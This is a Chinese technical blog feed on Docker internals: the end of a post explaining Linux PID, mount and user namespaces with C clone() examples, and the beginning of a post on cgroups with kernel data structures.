<p>也许试着不加CLONE_NEWUTS参数运行上述代码，发现主机名也变了，输入exit以后主机名也会变回来，似乎没什么区别。实际上不加CLONE_NEWUTS参数进行隔离而使用sethostname已经把宿主机的主机名改掉了。你看到exit退出后还原只是因为bash只在刚登录的时候读取一次UTS，当你重新登陆或者使用uname命令进行查看时，就会发现产生了变化。<br>Docker中，每个镜像基本都以自己所提供的服务命名了自己的hostname而没有对宿主机产生任何影响，用的就是这个原理</p>
<h4 id="PID-namespace"><a href="#PID-namespace" class="headerlink" title="PID namespace"></a><b>PID namespace</b></h4><p>PID namespace隔离非常实用，它对进程PID重新标号，即两个不同namespace下的进程可以有同一个PID。每个PID namespace都有自己的计数程序。<br>内核为所有的PID namespace维护了一个树状结构，最顶层的是系统初始时创建的，我们称之为root namespace。它创建的新PID namespace就称之为child namespace（树的子节点），而原先的PID namespace就是新创建的PID namespace的parent namespace（树的父节点）。<br>通过这种方式，不同的PID namespaces会形成一个等级体系。所属的父节点可以看到子节点中的进程，并可以通过信号等方式对子节点中的进程产生影响。反过来，子节点不能看到父节点PID namespace中的任何内容。<br>每个PID namespace中的第一个进程“PID 1“，都会像传统Linux中的init进程一样拥有特权，起特殊作用。<br>一个namespace中的进程，不可能通过kill或ptrace影响父节点或者兄弟节点中的进程，因为其他节点的PID在这个namespace中没有任何意义。<br>如果你在新的PID namespace中重新挂载/proc文件系统，会发现其下只显示同属一个PID namespace中的其他进程。<br>在root namespace中可以看到所有的进程，并且递归包含所有子节点中的进程。<br>到这里，可能你已经联想到一种在外部监控Docker中运行程序的方法了，就是监控Docker Daemon所在的PID namespace下的所有进程即其子进程，再进行删选即可。<br>修改上文的代码，加入PID namespace的标识位，并把程序命名为pid.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWPID | CLONE_NEWIPC | CLONE_NEWUTS </div><div class="line">           | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>编译运行可以看到如下结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall pid.c -o pid.o &amp;&amp; ./pid.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@NewNamespace:~# echo $$</div><div class="line">1                      &lt;&lt;--注意此处看到shell的PID变成了1</div><div class="line">root@NewNamespace:~# exit</div><div class="line">exit</div><div class="line">已退出</div></pre></td></tr></table></figure>
<p>打印$$可以看到shell的PID，退出后如果再次执行可以看到效果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@local:~# echo $$</div><div class="line">17542</div></pre></td></tr></table></figure>
<p>已经回到了正常状态。在子进程的shell中执行了ps aux/top之类的命令，发现还是可以看到所有父进程的PID，那是因为还没有对文件系统进行隔离，ps/top之类的命令调用的是真实系统下的/proc文件内容，看到的自然是所有的进程。<br>此外，与其他的namespace不同的是，为了实现一个稳定安全的容器，PID namespace还需要进行一些额外的工作才能确保其中的进程运行顺利</p>
<ul>
<li>PID namespace中的init进程<br>当我们新建一个PID namespace时，默认启动的进程PID为1。我们知道，在传统的UNIX系统中，PID为1的进程是init，地位非常特殊。他作为所有进程的父进程，维护一张进程表，不断检查进程的状态，一旦有某个子进程因为程序错误成为了“孤儿”进程，init就会负责回收资源并结束这个子进程。所以在你要实现的容器中，启动的第一个进程也需要实现类似init的功能，维护所有后续启动进程的运行状态。<br>PID namespace维护这样一个树状结构，非常有利于系统的资源监控与回收。<br>Docker启动时，第一个进程也是这样，实现了进程监控和资源回收，它就是dockerinit。</li>
<li>信号与init进程<br>PID namespace中的init进程如此特殊，自然内核也为他赋予了特权信号屏蔽。<br>如果init中没有写处理某个信号的代码逻辑，那么与init在同一个PID namespace下的进程发送给它的该信号都会被屏蔽。这个功能的主要作用是防止init进程被误杀。<br>父节点中的进程发送的信号，如果不是SIGKILL（销毁进程）或SIGSTOP（暂停进程）也会被忽略。但如果发送SIGKILL或SIGSTOP，子节点的init会强制执行，也就是说父节点中的进程有权终止子节点中的进程。<br>一旦init进程被销毁，同一PID namespace中的其他进程也会随之接收到SIGKILL信号而被销毁。理论上，该PID namespace自然也就不复存在了。但是如果/proc/[pid]/ns/pid处于被挂载或者打开状态，namespace就会被保留下来。然而，保留下来的namespace无法通过setns()或者fork()创建进程，所以实际上并没有什么作用。<br>Docker一旦启动就有进程在运行，不存在不包含任何进程的Docker，也就是这个道理。</li>
<li>挂载proc文件系统<br>如果在新的PID namespace中使用ps命令查看，看到的还是所有的进程，因为与PID直接相关的/proc文件系统（procfs）没有挂载到与原/proc不同的位置。所以如果只想看到PID namespace本身应该看到的进程，需要重新挂载/proc，命令如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@NewNamespace:~# mount -t proc proc /proc</div><div class="line">root@NewNamespace:~# ps a</div><div class="line">  PID TTY      STAT   TIME COMMAND</div><div class="line">    1 pts/1    S      0:00 /bin/bash</div><div class="line">   12 pts/1    R+     0:00 ps a</div></pre></td></tr></table></figure>
<p>可以看到实际的PID namespace就只有两个进程在运行。<br>因为此时没有进行mount namespace的隔离，所以这一步操作实际上已经影响了root namespace的文件系统，当退出新建的PID namespace以后再执行ps a就会发现出错，再次执行mount -t proc proc /proc可以修复错误。</p>
<ul>
<li>unshare()和setns()<br>unshare()允许用户在原有进程中建立namespace进行隔离。但是创建了PID namespace后，原先unshare()调用者进程并不进入新的PID namespace，接下来创建的子进程才会进入新的namespace，这个子进程也就随之成为新namespace中的init进程。<br>类似的，调用setns()创建新PID namespace时，调用者进程也不进入新的PID namespace，而是随后创建的子进程进入。<br>为什么创建其他namespace时unshare()和setns()会直接进入新的namespace而唯独PID namespace不是如此呢？<br>因为调用getpid()函数得到的PID是根据调用者所在的PID namespace而决定返回哪个PID，进入新的PID namespace会导致PID产生变化。而对用户态的程序和库函数来说，他们都认为进程的PID是一个常量，PID的变化会引起这些进程奔溃。<br>换句话说，一旦程序进程创建以后，那么它的PID namespace的关系就确定下来了，进程不会变更他们对应的PID namespace。</li>
</ul>
<h4 id="Mount-namespaces"><a href="#Mount-namespaces" class="headerlink" title="Mount namespaces"></a><b>Mount namespaces</b></h4><p>Mount namespace通过隔离文件系统挂载点对隔离文件系统提供支持，它是历史上第一个Linux namespace，它是为了解决clone()系统调用而增加的，由于当时想不到还会有其他的namespace，所以就给mount namespaces起了一个比较通用的名字，叫做CLONE_NEWNS，即new namespace的意思。那个时候更不要说会预见到有container这种东西了。</p>
<p>隔离后，不同mount namespace中的文件结构发生变化也互不影响。<br>可以通过/proc/[pid]/mounts查看到所有挂载在当前namespace中的文件系统，还可以通过/proc/[pid]/mountstats看到mount namespace中文件设备的统计信息，包括挂载文件的名字、文件系统类型、挂载位置等等。<br>进程在创建mount namespace时，会把当前的文件结构复制给新的namespace。新namespace中的所有mount操作都只影响自身的文件系统，而对外界不会产生任何影响。这样做非常严格地实现了隔离，但是某些情况可能并不适用。比如父节点namespace中的进程挂载了一张CD-ROM，这时子节点namespace拷贝的目录结构就无法自动挂载上这张CD-ROM，因为这种操作会影响到父节点的文件系统。<br>2006年引入的挂载传播（mount propagation）解决了这个问题，挂载传播定义了挂载对象之间的关系，系统用这些关系决定任何挂载对象中的挂载事件如何传播到其他挂载对象。所谓传播事件，是指由一个挂载对象的状态变化导致的其它挂载对象的挂载与解除挂载动作的事件。<br>共享关系（share relationship）。如果两个挂载对象具有共享关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，反之亦然。<br>从属关系（slave relationship）。如果两个挂载对象形成从属关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，但是反过来不行；在这种关系中，从属对象是事件的接收者。<br>一个挂载状态可能为如下的其中一种：<br>共享挂载（shared）<br>从属挂载（slave）<br>共享/从属挂载（shared and slave）<br>私有挂载（private）<br>不可绑定挂载（unbindable）<br>传播事件的挂载对象称为共享挂载（shared mount）；接收传播事件的挂载对象称为从属挂载（slave mount）。既不传播也不接收传播事件的挂载对象称为私有挂载（private mount）。另一种特殊的挂载对象称为不可绑定的挂载（unbindable mount），它们与私有挂载相似，但是不允许执行绑定挂载，即创建mount namespace时这块文件对象不可被复制。</p>
<p>共享挂载的应用场景非常明显，就是为了文件数据的共享所必须存在的一种挂载方式；从属挂载更大的意义在于某些“只读”场景；私有挂载其实就是纯粹的隔离，作为一个独立的个体而存在；不可绑定挂载则有助于防止没有必要的文件拷贝，如某个用户数据目录，当根目录被递归式的复制时，用户目录无论从隐私还是实际用途考虑都需要有一个不可被复制的选项。<br>默认情况下，所有挂载都是私有的。设置为共享挂载的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-shared &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>从共享挂载克隆的挂载对象也是共享的挂载；它们相互传播挂载事件。<br>设置为从属挂载的命令如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-slave &lt;shared-mount-object&gt;</div></pre></td></tr></table></figure>
<p>从从属挂载克隆的挂载对象也是从属的挂载，它也从属于原来的从属挂载的主挂载对象。<br>将一个从属挂载对象设置为共享/从属挂载，可以执行如下命令或者将其移动到一个共享挂载对象下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-shared &lt;slave-mount-object&gt;</div></pre></td></tr></table></figure>
<p>如果你想把修改过的挂载对象重新标记为私有的，可以执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-private &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>通过执行以下命令，可以将挂载对象标记为不可绑定的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-unbindable &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>这些设置都可以递归式地应用到所有子目录中，如果感兴趣可以搜索到相关的命令。<br>修改代码，并且另存为mount.c进行编译运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWIPC </div><div class="line">           | CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>执行的效果就如同PID namespace一节中“挂载proc文件系统”的执行结果，区别就是退出mount namespace以后，root namespace的文件系统不会被破坏</p>
<h4 id="User-namespaces"><a href="#User-namespaces" class="headerlink" title="User namespaces"></a><b>User namespaces</b></h4><p>User namespace主要隔离了安全相关的标识符（identifiers）和属性（attributes），包括用户ID、用户组ID、root目录、key（指密钥）以及特殊权限。说得通俗一点，一个普通用户的进程通过clone()创建的新进程在新user namespace中可以拥有不同的用户和用户组。这意味着一个进程在容器外属于一个没有特权的普通用户，但是他创建的容器进程却属于拥有所有权限的超级用户，这个技术为容器提供了极大的自由。<br>User namespace是目前的六个namespace中最后一个支持的，并且直到Linux内核3.8版本的时候还未完全实现。因为user namespace实际上并不算完全成熟，很多发行版担心安全问题，在编译内核的时候并未开启USER_NS。实际上目前Docker也还不支持user namespace，但是预留了相应接口。所以在进行接下来的实验时，请确保系统的Linux内核版本高于3.8并且内核编译时开启了USER_NS。<br>Linux中，特权用户的user ID就是0，演示的最终我们将看到user ID非0的进程启动user namespace后user ID可以变为0。使用user namespace的方法跟别的namespace相同，即调用clone()或unshare()时加入CLONE_NEWUSER标识位。<br>修改代码并另存为userns.c，为了看到用户权限(Capabilities)，可能你还需要安装一下libcap-dev包。<br>首先包含以下头文件以调用Capabilities包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#include &lt;sys/capability.h&gt;</div></pre></td></tr></table></figure>
<p>其次在子进程函数中加入geteuid()和getegid()得到namespace内部的user ID，其次通过cap_get_proc()得到当前进程的用户拥有的权限，并通过cap_to_text（）输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int child_main(void* args) &#123;</div><div class="line">        printf(&quot;在子进程中!\n&quot;);</div><div class="line">        cap_t caps;</div><div class="line">        printf(&quot;eUID = %ld;  eGID = %ld;  &quot;,</div><div class="line">                        (long) geteuid(), (long) getegid());</div><div class="line">        caps = cap_get_proc();</div><div class="line">        printf(&quot;capabilities: %s\n&quot;, cap_to_text(caps, NULL));</div><div class="line">        execv(child_args[0], child_args);</div><div class="line">        return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在主函数的clone()调用中加入我们熟悉的标识符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">            CLONE_NEWUSER | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>在编译之前先查看一下当前用户的uid和guid，请注意此时是普通用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ id -u</div><div class="line">1000</div><div class="line">$ id -g</div><div class="line">1000</div></pre></td></tr></table></figure>
<p>然后开始编译运行，并进行新建的user namespace，会发现shell提示符前的用户名已经变为nobody</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc userns.c -Wall -lcap -o userns.o &amp;&amp; ./userns.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">eUID = 65534;  eGID = 65534;  capabilities: = cap_chown,cap_dac_override,[...]37+ep  &lt;&lt;--</div></pre></td></tr></table></figure>
<p>通过验证可以得到以下信息。<br>user namespace被创建后，第一个进程被赋予了该namespace中的全部权限，这样这个init进程就可以完成所有必要的初始化工作，而不会因权限不足而出现错误。</p>
<p>我们看到namespace内部看到的UID和GID已经与外部不同了，默认显示为65534，表示尚未与外部namespace用户映射。我们需要对user namespace内部的这个初始user和其外部namespace某个用户建立映射，这样可以保证当涉及到一些对外部namespace的操作时，系统可以检验其权限（比如发送一个信号或操作某个文件）。同样用户组也要建立映射。<br>还有一点虽然不能从输出中看出来，但是值得注意。用户在新namespace中有全部权限，但是他在创建他的父namespace中不含任何权限。就算调用和创建他的进程有全部权限也是如此。所以哪怕是root用户调用了clone()在user namespace中创建出的新用户在外部也没有任何权限。<br>最后，user namespace的创建其实是一个层层嵌套的树状结构。最上层的根节点就是root namespace，新创建的每个user namespace都有一个父节点user namespace以及零个或多个子节点user namespace，这一点与PID namespace非常相似。<br>通过在/proc/[pid]/uid_map和/proc/[pid]/gid_map两个文件中写入对应的绑定信息可以实现这一点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ID-inside-ns   ID-outside-ns   length</div></pre></td></tr></table></figure>
<p>写这两个文件需要注意以下几点。<br>这两个文件只允许由拥有该user namespace中CAP_SETUID权限的进程写入一次，不允许修改。<br>写入的进程必须是该user namespace的父namespace或者子namespace。<br>第一个字段ID-inside-ns表示新建的user namespace中对应的user/group ID，第二个字段ID-outside-ns表示namespace外部映射的user/group ID。最后一个字段表示映射范围，通常填1，表示只映射一个，如果填大于1的值，则按顺序建立一一映射</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">void set_uid_map(pid_t pid, int inside_id, int outside_id, int length) &#123;</div><div class="line">    char path[256];</div><div class="line">    sprintf(path, &quot;/proc/%d/uid_map&quot;, getpid());</div><div class="line">    FILE* uid_map = fopen(path, &quot;w&quot;);</div><div class="line">    fprintf(uid_map, &quot;%d %d %d&quot;, inside_id, outside_id, length);</div><div class="line">    fclose(uid_map);</div><div class="line">&#125;</div><div class="line">void set_gid_map(pid_t pid, int inside_id, int outside_id, int length) &#123;</div><div class="line">    char path[256];</div><div class="line">    sprintf(path, &quot;/proc/%d/gid_map&quot;, getpid());</div><div class="line">    FILE* gid_map = fopen(path, &quot;w&quot;);</div><div class="line">    fprintf(gid_map, &quot;%d %d %d&quot;, inside_id, outside_id, length);</div><div class="line">    fclose(gid_map);</div><div class="line">&#125;</div><div class="line">int child_main(void* args) &#123;</div><div class="line">    cap_t caps;</div><div class="line">    printf(&quot;在子进程中!\n&quot;);</div><div class="line">    set_uid_map(getpid(), 0, 1000, 1);</div><div class="line">    set_gid_map(getpid(), 0, 1000, 1);</div><div class="line">    printf(&quot;eUID = %ld;  eGID = %ld;  &quot;,</div><div class="line">            (long) geteuid(), (long) getegid());</div><div class="line">    caps = cap_get_proc();</div><div class="line">    printf(&quot;capabilities: %s\n&quot;, cap_to_text(caps, NULL));</div><div class="line">    execv(child_args[0], child_args);</div><div class="line">    return 1;</div><div class="line">&#125;</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>编译后即可看到user已经变成了root</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc userns.c -Wall -lcap -o usernc.o &amp;&amp; ./usernc.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">eUID = 0;  eGID = 0;  capabilities: = [...],37+ep</div></pre></td></tr></table></figure>
<p>至此已经完成了绑定的工作，可以看到演示全程都是在普通用户下执行的。最终实现了在user namespace中成为了root而对应到外面的是一个uid为1000的普通用户。<br>如果要把user namespace与其他namespace混合使用，那么依旧需要root权限。解决方案可以是先以普通用户身份创建user namespace，然后在新建的namespace中作为root再clone()进程加入其他类型的namespace隔离。<br>虽然Docker目前尚未使用user namespace，但是他用到了user namespace中的Capabilities机制。<br>从内核2.2版本开始，Linux把原来和超级用户相关的高级权限划分成为不同的单元，称为Capability。这样管理员就可以独立对特定的Capability进行使能或禁止。Docker虽然没有使用user namespace，但是他可以禁用容器中不需要的Capability，一次在一定程度上加强容器安全性</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><b>总结</b></h4><p>虽然namespace技术使用起来非常简单，但是要真正把容器做到安全易用却并非易事。PID namespace中，要实现一个完善的init进程来维护好所有进程；network namespace中，还有复杂的路由表和iptables规则没有配置；user namespace中还有很多权限上的问题需要考虑等等。其中有些方面Docker已经做的很好，有些方面也才刚刚开始</p>
<p>ref </p>
<p><a href="http://70data.net/1165.html" target="_blank" rel="external">Docker学习笔记（四）Linux namespace</a><br><a href="http://coolshell.cn/articles/17010.html" target="_blank" rel="external">Docker基础技术：Linux Namespace（上）</a><br><a href="http://blog.csdn.net/liumiaocn/article/details/52549595" target="_blank" rel="external">Docker基础: Linux内核命名空间之（3）net namespace</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux Namespace是Linux提供的一种内核级别环境隔离的方法,它有如下分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mount-提供磁盘挂载点和文件系统的隔离能力&lt;/li&gt;
&lt;li&gt;ipc-提供进程间通信的隔离能力，用来隔离System V IPC标识以及Posix消息队
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>docker学习笔记之Linux cgroups</title>
    <link href="https://t1ger.github.io/2016/11/25/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BLinux-cgroups/"/>
    <id>https://t1ger.github.io/2016/11/25/docker学习笔记之Linux-cgroups/</id>
    <published>2016-11-25T06:50:26.000Z</published>
    <updated>2016-11-25T10:31:49.561Z</updated>
    
    <content type="html"><![CDATA[<h4 id="cgroup是什么"><a href="#cgroup是什么" class="headerlink" title="cgroup是什么"></a><b>cgroup是什么</b></h4><p>Linux CGroup全称Linux Control Group,Linux内核的一个功能,用来限制、控制与分离一个进程组群的资源(如CPU、内存、磁盘输入输出等),它最初叫Process Container,由Google工程师(Paul Menage和Rohit Seth)于2006年提出,后来因为Container有多重含义容易引起误解,就在2007年更名为Control Groups,并被整合进Linux内核2.6.24。<br>通俗的来说,cgroups可以限制、记录、隔离进程组所使用的物理资源,为容器实现虚拟化提供了基本保证,是构建Docker等一系列虚拟化管理工具的基石</p>
<p>本质上来说,cgroups是内核附加在程序上的一系列钩子(hooks),通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的<br>对开发者来说,cgroups有如下四个有趣的特点：</p>
<ul>
<li>cgroups的API以一个伪文件系统的方式实现,即用户可以通过文件操作实现cgroups的组织管理</li>
<li>cgroups的组织管理操作单元可以细粒度到线程级别,用户态代码也可以针对系统分配的资源创建和销毁cgroups,从而实现资源再分配和管理</li>
<li>所有资源管理的功能都以“subsystem(子系统)”的方式实现,接口统一</li>
<li>子进程创建之初与其父进程处于同一个cgroups的控制组</li>
</ul>
<h4 id="cgroup的功能"><a href="#cgroup的功能" class="headerlink" title="cgroup的功能"></a><b>cgroup的功能</b></h4><p>cgroups提供了以下四个功能</p>
<ul>
<li>资源限制(Resource Limitation):对进程组使用的资源总额进行限制<br>假如设置了内存上限,一旦超过配额就发出OOM(out of memory)</li>
<li>优先级分配(Prioritization):通过分配cpu的时间片数据及磁盘io带宽大学,进而控制了进程运行的优先级</li>
<li>资源统计(Accounting):统计系统资源使用量,比如统计cpu时长,内存用量,可用于计费功能</li>
<li>进程控制(Control):可以对进程组执行挂起、恢复等操作</li>
</ul>
<p>备注:有一段时间,内核开发者甚至把namespace也作为一个cgroups的subsystem加入进来,也就是说cgroups曾经甚至还包含了资源隔离的能力。但是资源隔离会给cgroups带来许多问题,如PID在循环出现的时候cgroup却出现了命名冲突、cgroup创建后进入新的namespace导致脱离了控制等等,所以在2011年就被移除了</p>
<p>在实践中，SA一般会利用cgroup做下面这些事：</p>
<ul>
<li>隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源</li>
<li>为这组进程 分配其足够使用的内存</li>
<li>为这组进程分配相应的网络带宽和磁盘存储限制</li>
<li>限制访问某些设备(通过设置设备的白名单)</li>
</ul>
<h4 id="组织结构和规则"><a href="#组织结构和规则" class="headerlink" title="组织结构和规则"></a><b>组织结构和规则</b></h4><p>在传统Unix进程管理,实际上是先启动init进程作为根节点,再由init节点创建子进程作为子节点,而每个子节点由可以创建新的子节点,如此往复,形成一个树状结构<br>cgroup也是类似的树状结构,子节点也从父节点继承属性<br>区别在于,cgroup构成的hierarchy可以允许存在多个,如果进程模型是由init作为根节点构成的一棵树的话,那么cgroups的模型则是由多个hierarchy构成的森林。原因在于,如果只有一个hierarchy,那么所有的task都要受到绑定其上的subsystem的限制,会给那些不需要这些限制的task造成麻烦</p>
<ul>
<li>规则1:同一个hierarchy可以附加一个或多个subsystem,cpu和memory的subsystem附加到了一个hierarchy</li>
<li>规则2:一个subsystem可以附加到多个hierarchy,当且仅当这些hierarchy只有这唯一一个subsystem</li>
<li>规则3:系统每次新建一个hierarchy时,该系统上的所有task默认构成了这个新建的hierarchy的初始化cgroup,这个cgroup也称为root cgroup。对于你创建的每个hierarchy,task只能存在于其中一个cgroup中,即一个task不能存在于同一个hierarchy的不同cgroup中,但是一个task可以存在在不同hierarchy中的多个cgroup中。如果操作时把一个task添加到同一个hierarchy中的另一个cgroup中,则会从第一个cgroup中移除</li>
<li>规则4:进程（task）在fork自身时创建的子任务(child task)默认与原task在同一个cgroup中,但是child task允许被移动到不同的cgroup中。即fork完成后,父子进程间是完全独立的</li>
</ul>
<h4 id="cgroup工作原理和实现方式"><a href="#cgroup工作原理和实现方式" class="headerlink" title="cgroup工作原理和实现方式"></a><b>cgroup工作原理和实现方式</b></h4><ul>
<li>cgroup实现结构讲解<br>cgroup的实现本质上是给系统进程挂上钩子(hooks),当task运行的过程中涉及到某个资源时就会触发钩子上所附带的subsystem进行检测,最终根据资源类别的不同使用对应的技术进行资源限制和优先级分配</li>
</ul>
<p>Linux中管理task进程的数据结构为task_struct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#ifdef CONFIG_CGROUPS </div><div class="line">/* Control Group info protected by css_set_lock */ </div><div class="line">struct css_set *cgroups; </div><div class="line">/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */ </div><div class="line">struct list_head cg_list; </div><div class="line">#endif</div><div class="line">struct css_set &#123; </div><div class="line">atomic_t refcount;</div><div class="line">struct hlist_node hlist; </div><div class="line">struct list_head tasks; </div><div class="line">struct list_head cg_links; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">&#125;;</div><div class="line">struct cgroup_subsys_state &#123; </div><div class="line">struct cgroup *cgroup; </div><div class="line">atomic_t refcnt; </div><div class="line">unsigned long flags; </div><div class="line">struct css_id *id; </div><div class="line">&#125;;</div><div class="line">struct cgroup &#123; </div><div class="line">unsigned long flags; </div><div class="line">atomic_t count; </div><div class="line">struct list_head sibling; </div><div class="line">struct list_head children; </div><div class="line">struct cgroup *parent; </div><div class="line">struct dentry *dentry; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct cgroupfs_root *root;</div><div class="line">struct cgroup *top_cgroup; </div><div class="line">struct list_head css_sets; </div><div class="line">struct list_head release_list; </div><div class="line">struct list_head pidlists;</div><div class="line">struct mutex pidlist_mutex; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">struct list_head event_list; </div><div class="line">spinlock_t event_list_lock; </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>在task_struct中,与cgroup相关的字段主要有两个,一个是css_set *cgroups,表示指向css_set（包含进程相关的cgroups信息）的指针,一个task只对应一个css_set结构,但是一个css_set可以被多个task使用。另一个字段是list_head cg_list,是一个链表的头指针,这个链表包含了所有的链到同一个css_set的task进程。每个css_set结构中都包含了一个指向cgroup_subsys_state(包含进程与一个特定子系统相关的信息)的指针数组。cgroup_subsys_state则指向了cgroup结构(包含一个cgroup的所有信息),通过这种方式间接的把一个进程和cgroup联系了起来</p>
<p>另一方面,cgroup结构体中有一个list_head css_sets字段,它是一个头指针,指向由cg_cgroup_link（包含cgroup与task之间多对多关系的信息）形成的链表。由此获得的每一个cg_cgroup_link都包含了一个指向css_set *cg字段,指向了每一个task的css_set。css_set结构中则包含tasks头指针,指向所有链到此css_set的task进程构成的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct cg_cgroup_link &#123; </div><div class="line">struct list_head cgrp_link_list; </div><div class="line">struct cgroup *cgrp; </div><div class="line">struct list_head cg_link_list; </div><div class="line">struct css_set *cg; &#125;;</div></pre></td></tr></table></figure>
<p>css_set中也有指向所有cg_cgroup_link构成链表的头指针,通过这种方式也能定位到所有的cgroup</p>
